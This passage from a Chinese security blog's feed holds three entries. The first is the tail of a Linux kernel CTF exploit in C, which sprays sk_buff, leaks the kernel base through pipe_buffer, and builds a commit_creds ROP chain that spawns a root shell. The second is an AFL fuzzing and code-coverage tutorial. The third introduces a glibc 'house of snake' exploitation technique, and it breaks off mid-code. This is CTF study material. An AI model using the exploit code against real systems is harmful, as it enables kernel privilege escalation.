&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg,</span><br><span class="line">                     <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got pipe_buf_ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_addr = pipe_buf_ptr-&gt;ops;</span><br><span class="line">                kernel_offset = kernel_addr - <span class="number">0xffffffff81e2d980</span>;</span><br><span class="line">                kernel_base = kernel_offset + <span class="number">0xffffffff81000000</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%p \033[32m\033[1moffset: \033[0m%p\n&quot;</span>,</span><br><span class="line">           kernel_base, kernel_offset);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> init_cred = <span class="number">0xffffffff8224aca0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> commit_creds = <span class="number">0xffffffff810bb710</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff811af57d</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> swapgs_iretq = <span class="number">0xffffffff81a010eb</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> push_rsi_pop_rsp_rbx_r12 = <span class="number">0xffffffff8133151b</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;196082&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake_secondary_msg + <span class="number">0x18</span>) = <span class="number">0xffffffff81000390</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (struct pipe_buf_operations *)&amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = push_rsi_pop_rsp_rbx_r12;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rop = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span> *)&amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop++] = pop_rdi;</span><br><span class="line">    rop_chain[rop++] = init_cred;</span><br><span class="line">    rop_chain[rop++] = commit_creds;</span><br><span class="line">    rop_chain[rop++] = swapgs_iretq;</span><br><span class="line">    rop_chain[rop++] = get_shell;</span><br><span class="line">    rop_chain[rop++] = user_cs;</span><br><span class="line">    rop_chain[rop++] = user_rflags;</span><br><span class="line">    rop_chain[rop++] = user_sp;</span><br><span class="line">    rop_chain[rop++] = user_ss;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rop_chain is ready\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;spray sk_buff complete!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230331103838088.png"                      alt="image-20230331103838088"                ></p><p>吐槽一下：一道题目用了五个gadget文件！！！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ctf ls -l | grep gadget</span><br><span class="line">-rw-r--r--   1 tcdy  staff   14478379  3 29 19:14 gadget.txt</span><br><span class="line">-rw-rw-r--@  1 tcdy  staff  325376514  3 29 19:24 gadget2.txt</span><br><span class="line">-rw-rw-r--@  1 tcdy  staff  113547117  3 30 13:43 gadget3.txt</span><br><span class="line">-rw-rw-r--@  1 tcdy  staff   21718691  3 30 14:38 gadget4.txt</span><br><span class="line">-rw-r--r--   1 tcdy  staff    4499639  3 30 15:08 gadget5.txt</span><br></pre></td></tr></table></figure><hr><p>参考链接:<br>    <a class="link"   href="https://arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/" >https://arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/<i class="fas fa-external-link-alt"></i></a><br>    <a class="link"   href="https://elixir.bootlin.com/linux/v5.19/source/ipc/msg.c#L1068" >https://elixir.bootlin.com/linux/v5.19/source/ipc/msg.c#L1068<i class="fas fa-external-link-alt"></i></a><br>题目链接:<br>    墨晚鸢佬自己有题目链接，这里就不上传啦。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;当初看到墨晚鸢大佬的博客对这道题目的描述的时候就对这道题暗生情愫了，如今终于是得以复现。&lt;/p&gt;
&lt;h2 id=&quot;内核分析&quot;&gt;&lt;a href=&quot;#内核分析&quot; class=&quot;headerlink&quot; title=&quot;内核分析&quot;&gt;&lt;/a&gt;内核分析&lt;/h2&gt;&lt;h3 id=&quot;函数分析&quot;</summary>
      
    
    
    
    <category term="比赛复现" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="msg_msg" scheme="https://cv196082.gitee.io/tags/msg-msg/"/>
    
    <category term="sk_buff" scheme="https://cv196082.gitee.io/tags/sk-buff/"/>
    
    <category term="pipe_buffer" scheme="https://cv196082.gitee.io/tags/pipe-buffer/"/>
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/tags/qemu-escape/"/>
    
  </entry>
  
  <entry>
    <title>FUZZ(2):AFL结果分析和代码覆盖率</title>
    <link href="https://cv196082.gitee.io/2023/03/23/AFL%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90%E5%92%8C%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/"/>
    <id>https://cv196082.gitee.io/2023/03/23/AFL%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90%E5%92%8C%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/</id>
    <published>2023-03-23T13:47:34.000Z</published>
    <updated>2023-03-23T13:47:18.753Z</updated>
    
    <content type="html"><![CDATA[<p>本来不打算做AFL的源码分析，但是看到了一篇文章吸引到了我，当然这篇文章还是不会涉及到源码分析，在后续的FUZZ相关文章中会进行进一步分析。</p><h2 id="fuzzer工作状态"><a href="#fuzzer工作状态" class="headerlink" title="fuzzer工作状态"></a>fuzzer工作状态</h2><p>首先可以查看在<code>output</code>目录下的<code>fuzzer_state</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">➜  afl-2.52b cat ./afl_test/output_dir/fuzzer_stats</span><br><span class="line">start_time        : 1679542022</span><br><span class="line">last_update       : 1679542022</span><br><span class="line">fuzzer_pid        : 541718</span><br><span class="line">cycles_done       : 0</span><br><span class="line">execs_done        : 24</span><br><span class="line">execs_per_sec     : 387.10</span><br><span class="line">paths_total       : 3</span><br><span class="line">paths_favored     : 2</span><br><span class="line">paths_found       : 0</span><br><span class="line">paths_imported    : 0</span><br><span class="line">max_depth         : 1</span><br><span class="line">cur_path          : 0</span><br><span class="line">pending_favs      : 2</span><br><span class="line">pending_total     : 3</span><br><span class="line">variable_paths    : 0</span><br><span class="line">stability         : 100.00%</span><br><span class="line">bitmap_cvg        : 0.05%</span><br><span class="line">unique_crashes    : 0</span><br><span class="line">unique_hangs      : 0</span><br><span class="line">last_path         : 0</span><br><span class="line">last_crash        : 0</span><br><span class="line">last_hang         : 0</span><br><span class="line">execs_since_crash : 24</span><br><span class="line">exec_timeout      : 20</span><br><span class="line">afl_banner        : <span class="built_in">test</span></span><br><span class="line">afl_version       : 2.52b</span><br><span class="line">target_mode       : qemu </span><br><span class="line">command_line      : ./afl-fuzz -i ./afl_test/input_dir -o ./afl_test/output_dir -Q ./afl_test/<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>不过这里我在运行时cat几次内容都没有发生变化所以我猜测应该是运行开始时产生，运行结束时才修改内容。那么如果想要实时的查看运行情况的话可以用<code>afl-whatsup</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">➜  afl-2.52b ./afl-whatsup ./afl_test</span><br><span class="line">status check tool <span class="keyword">for</span> afl-fuzz by &lt;lcamtuf@google.com&gt;</span><br><span class="line"></span><br><span class="line">Individual fuzzers</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">test</span> (0 days, 0 hrs) &lt;&lt;&lt;</span><br><span class="line"></span><br><span class="line">  <span class="string">cycle 1, lifetime speed 2 execs/sec, path 0/3 (0%)</span></span><br><span class="line"><span class="string">  pending 2/3, coverage 0.05%, no crashes yet</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Summary stats</span></span><br><span class="line"><span class="string">=============</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       Fuzzers alive : 1</span></span><br><span class="line"><span class="string">      Total run time : 0 days, 0 hours</span></span><br><span class="line"><span class="string">         Total execs : 0 million</span></span><br><span class="line"><span class="string">    Cumulative speed : 2 execs/sec</span></span><br><span class="line"><span class="string">       Pending paths : 2 faves, 3 total</span></span><br><span class="line"><span class="string">       Crashes found : 0 locally unique</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">➜  afl-2.52b ./afl-whatsup ./afl_test</span></span><br><span class="line"><span class="string">status check tool for afl-fuzz by &lt;lcamtuf@google.com&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Individual fuzzers</span></span><br><span class="line"><span class="string">==================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; test (0 days, 0 hrs) &lt;&lt;&lt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  cycle</span> 96, lifetime speed 1480 execs/sec, path 3/4 (75%)</span><br><span class="line">  pending 0/0, coverage 0.05%, crash count 3 (!)</span><br><span class="line"></span><br><span class="line">Summary stats</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">       Fuzzers alive : 1</span><br><span class="line">      Total run time : 0 days, 0 hours</span><br><span class="line">         Total execs : 0 million</span><br><span class="line">    Cumulative speed : 1480 execs/sec</span><br><span class="line">       Pending paths : 0 faves, 0 total</span><br><span class="line">       Crashes found : 3 locally unique</span><br></pre></td></tr></table></figure><p>虽然但是，我感觉我这里好像使用有问题，但是先不管那么多了。</p><p>再简单介绍一下<code>afl-plot</code>，这个工具总结出来的内容更为直观，可以直接图形化显示。这里存在一定依赖问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gnuplot</span><br><span class="line">afl-plot afl_state_dir graph_output_dir</span><br></pre></td></tr></table></figure><p>下面就是输出出来的结果，但是不知道为什么这里的<code>total paths</code>没有显示，我猜测可能是因为这里不是使用<code>afl-gcc</code>进行编译或者就是我的电脑性能太拉了。这里的<code>uniq crashes</code>开始在增加随后逐渐趋于平稳。最后一个就是执行速度，随着时间的推移也是越来越慢了，当然也可能是因为占用了太多的系统资源。<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323142824705.png"                      alt="image-20230323142824705"                ></p><p>然后再说说pythia插件吧，这个插件可以看到发现新的crash和path的概率。他与原版也只是差了几个字段。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323153710947.png"                      alt="image-20230323153710947"                ></p><p>这里在<code>process timing</code>里面框中出现了两个新的字段分别是<code>correctiness</code>和<code>fuzzability</code>，他们的含义分别是在没有发现crash时，发现一个导致crash输入的概率，表示在该程序中发现新路径的难度，该数值越高代表程序越容易Fuzz。在<code>overall results</code>框中也多了两个，第一个是当前发现的路径，一个是路径覆盖率。</p><h2 id="何时关闭fuzz"><a href="#何时关闭fuzz" class="headerlink" title="何时关闭fuzz"></a>何时关闭fuzz</h2><p>用过就能知道的是fuzz其实是无限执行下去的，这里可以用上面的几种方法来观察是否该结束，当然这里也可以直接在原始的AFL中看到何时该结束，注意这里<code>cycles done</code>的颜色，在fuzz的过程中这个颜色是一直会变化的，可以看到上面的图中颜色为紫色，这里为蓝色。所以他的变化顺序为紫色-&gt;黄色-&gt;蓝色-&gt;绿色，当为绿色是就代表很难再找到新的crash了，而这个时候就可以结束了。(下图为蓝色主要是受我电脑性能影响的)<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323140202009.png"                      alt="image-20230323140202009"                ></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  output_dir tree</span><br><span class="line">.</span><br><span class="line">├── crashes</span><br><span class="line">│   ├── id:000000,sig:06,src:000001,op:havoc,rep:64</span><br><span class="line">│   ├── id:000001,sig:11,src:000000,op:flip1,pos:1</span><br><span class="line">│   ├── id:000002,sig:11,src:000000,op:havoc,rep:16</span><br><span class="line">│   └── README.txt</span><br><span class="line">├── fuzz_bitmap</span><br><span class="line">├── fuzzer_stats</span><br><span class="line">├── hangs</span><br><span class="line">├── plot_data</span><br><span class="line">└── queue</span><br><span class="line">    ├── id:000000,orig:in.txt</span><br><span class="line">    ├── id:000001,orig:in1.txt</span><br><span class="line">    ├── id:000002,orig:in2.txt</span><br><span class="line">    └── id:000003,src:000001,op:arith8,pos:0,val:-27,+cov</span><br></pre></td></tr></table></figure><p>queue：存放所有具有独特执行路径的测试用例。<br>crashes：导致目标接收致命signal而崩溃的独特测试用例。<br>crashes/README.txt：保存了目标执行这些crash文件的命令行参数。<br>hangs：导致目标超时的独特测试用例。<br>fuzzer_stats：afl-fuzz的运行状态。<br>plot_data：用于afl-plot绘图。</p><h2 id="处理测试结果"><a href="#处理测试结果" class="headerlink" title="处理测试结果"></a>处理测试结果</h2><p>这里只介绍两种方式，一是<code>crashwalk</code>再就是<code>afl-collect</code></p><h3 id="crashwalk"><a href="#crashwalk" class="headerlink" title="crashwalk"></a>crashwalk</h3><p>安装过程这里就不再说了，网上很多，搜搜就有。</p><p>首先这个有两种模式，一是<code>Manual Mode</code>其次就是<code>AFL Mode</code>，他们的命令新式分别如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/tools/go/bin/cwtriage -root syncdir/fuzzer1/crashes/ -match id -- ~/parse @@</span><br><span class="line">~/tools/go/bin/cwtriage -root syncdir -afl</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323190851304.png"                      alt="image-20230323190851304"                ></p><p>这里使用的是第一种方式(用AFL时我这里会出现无法<code>no crash detected</code>错误)。</p><p>可以看到这里的描述中写上了栈溢出漏洞。</p><h3 id="afl-collect"><a href="#afl-collect" class="headerlink" title="afl-collect"></a>afl-collect</h3><p>这个工具使用命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./afl-collect -j 8 -d crashes.db -e gdb_script ./afl_sync_dir ./collection_dir --  /path/to/target --target-opts</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323195200830.png"                      alt="image-20230323195200830"                ></p><p>结果比上面的更为直观。</p><h2 id="代码覆盖率"><a href="#代码覆盖率" class="headerlink" title="代码覆盖率"></a>代码覆盖率</h2><p>代码覆盖率是模糊测试中一个极其重要的概念，使用代码覆盖率可以评估和改进测试过程，执行到的代码越多，找到bug的可能性就越大，毕竟，在覆盖的代码中并不能100%发现bug，在未覆盖的代码中却是100%找不到任何bug的，所以本节中就将详细介绍代码覆盖率的相关概念。</p><p>代码覆盖率是一种度量代码的覆盖程度的方式，也就是指源代码中的某行代码是否已执行；对二进制程序，还可将此概念理解为汇编代码中的某条指令是否已执行。其计量方式很多，但无论是GCC的GCOV还是LLVM的SanitizerCoverage，都提供函数（function）、基本块（basic-block）、边界（edge）三种级别的覆盖率检测，更具体的细节可以参考LLVM的<a class="link"   href="https://clang.llvm.org/docs/SanitizerCoverage.html" >官方文档<i class="fas fa-external-link-alt"></i></a>。</p><h3 id="基本块"><a href="#基本块" class="headerlink" title="基本块"></a>基本块</h3><blockquote><p>只有一个入口点，BB中的指令不是任何<strong>跳转指令</strong>的目标。</p><p>只有一个退出点，只有最后一条指令使执行流程转移到另一个BB</p></blockquote><p>如下图中的代码就可以被切割为4个基本块，平时我们在IDA图形模式中看到的就是一个一个的基本块<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/1552285577000-006tNc79gy1fz1gm5zohnj30sj0ikahx.jpg-w331s.jpg"                                     ></p><p>拿一个程序举例，在ida中每一块就代表一个基本块。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323200531347.png"                      alt="image-20230323200531347"                ></p><h3 id="边"><a href="#边" class="headerlink" title="边"></a>边</h3><p>依旧是上面ida的图，每一条线，也就是每一个箭头就代表一个边。</p><h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><p>在AFL中，使用二元组(branch_src, branch_dst)来记录<strong>当前基本块</strong> + <strong>前一基本块</strong>的信息，从而获取目标的执行流程和代码覆盖情况，伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;            <span class="comment">//用一个随机数标记当前基本块</span></span><br><span class="line">shared_mem[cur_location ^ prev_location]++;        <span class="comment">//将当前块和前一块异或保存到shared_mem[]</span></span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;                <span class="comment">//cur_location右移1位区分从当前块到当前块的转跳</span></span><br></pre></td></tr></table></figure><p>实际插入的汇编代码，如下图所示，首先保存各种寄存器的值并设置rcx，然后调用<code>__afl_maybe_log</code>，这个方法的内容相当复杂，这里就不展开讲了，但其主要功能就和上面的伪代码相似，用于记录覆盖率，放入一块共享内存中。<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323200655405.png"                      alt="image-20230323200655405"                ></p><h2 id="计算代码覆盖率"><a href="#计算代码覆盖率" class="headerlink" title="计算代码覆盖率"></a>计算代码覆盖率</h2><p>这里计算代码覆盖率主要是介绍两个工具，一是GCOV另一个则是LCOV它是GCOV的前端。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323214327472.png"                      alt="image-20230323214327472"                ></p><p>可以看到这里有覆盖率之类的东西，当然也可以在网页中打开</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323214409463.png"                      alt="image-20230323214409463"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323214533298.png"                      alt="image-20230323214533298"                ></p><p>点开文件会有更为详细的数据，每行代码前的数字代表被执行的次数，其中红色的代表未执行过的。</p><hr><p>参考链接:<br>    <a class="link"   href="https://paper.seebug.org/842/#4-afl-collect" >https://paper.seebug.org/842/#4-afl-collect<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本来不打算做AFL的源码分析，但是看到了一篇文章吸引到了我，当然这篇文章还是不会涉及到源码分析，在后续的FUZZ相关文章中会进行进一步分析。&lt;/p&gt;
&lt;h2 id=&quot;fuzzer工作状态&quot;&gt;&lt;a href=&quot;#fuzzer工作状态&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/categories/FUZZ/"/>
    
    
    <category term="AFL" scheme="https://cv196082.gitee.io/tags/AFL/"/>
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/tags/FUZZ/"/>
    
  </entry>
  
  <entry>
    <title>house of snake</title>
    <link href="https://cv196082.gitee.io/2023/03/22/house-of-snake/"/>
    <id>https://cv196082.gitee.io/2023/03/22/house-of-snake/</id>
    <published>2023-03-22T05:32:33.000Z</published>
    <updated>2023-03-23T12:11:46.982Z</updated>
    
    <content type="html"><![CDATA[<p>这house of系列是真的多，上一个还没捂热下一个就来了，glibc更新也是真快。不过能在学习新东西的途中水一篇文章还是相当不错的。</p><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>在glibc2.37中<code>_IO_obstack_jumps</code>被删除啦，导致前一篇的利用方式无了。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>这次聚焦的vtable是:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到这里只有两个函数，并且我们真正使用的只有第一个函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">__printf_buffer_as_file_overflow (FILE *fp, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span> *<span class="title">file</span> =</span> (struct __printf_buffer_as_file *) fp;</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_commit (file);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* EOF means only a flush is requested.   */</span></span><br><span class="line">  <span class="keyword">if</span> (ch != EOF)</span><br><span class="line">    __printf_buffer_putc (file-&gt;next, ch);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ensure that flushing actually produces room.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next)</span><br><span class="line">      &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</span><br><span class="line">    __printf_buffer_flush (file-&gt;next);</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_switch_to_buffer (file);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next))</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数一来就是一个强制类型转化为<code>__printf_buffer_as_file</code>结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span 